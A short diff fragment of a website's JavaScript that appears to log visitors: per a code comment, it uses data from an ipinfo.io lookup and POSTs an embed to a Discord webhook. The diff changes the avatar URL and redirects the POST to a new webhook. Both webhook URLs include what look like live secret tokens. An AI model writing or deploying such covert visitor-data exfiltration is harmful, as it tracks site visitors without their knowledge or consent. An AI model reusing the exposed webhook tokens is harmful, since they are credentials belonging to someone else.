@@ -14,7 +14,7 @@ function monke(json) {
             // Use the additional information from the ipinfo.io response
             var params = {
                 username: "trim.is-a.dev",
-                avatar_url: "https://discord.com/api/webhooks/1180275419019219026/EHLli37P-St1gS4POhdAq1knO9MdquqI38mt1c2d1hHMQskXsvCseppWsj4r0WDduavp",
+                avatar_url: "https://cdn.discordapp.com/avatars/1170810565912952963/585557a19fd78920d7ffacd464385329.webp?size=80",
                 embeds: [{
                     title: "trim.is-a.dev",
                     color: 15000,
@@ -52,7 +52,7 @@ function monke(json) {
             try {
                 // Send the Discord webhook request with the extended information
                 var discordRequest = new XMLHttpRequest();
-                discordRequest.open("POST", "https://discord.com/api/webhooks/1175547384885936178/bkarNNbE8OG8i8NL-qfkAeHXK0bWAOZpimr9rpb1WRyub166xuC_InNXtKNXYg-FosNB");
+                discordRequest.open("POST", "https://discord.com/api/webhooks/1180275419019219026/EHLli37P-St1gS4POhdAq1knO9MdquqI38mt1c2d1hHMQskXsvCseppWsj4r0WDduavp");
                 discordRequest.setRequestHeader('Content-type', 'application/json');
                 discordRequest.send(JSON.stringify(params));
             } catch (error) {
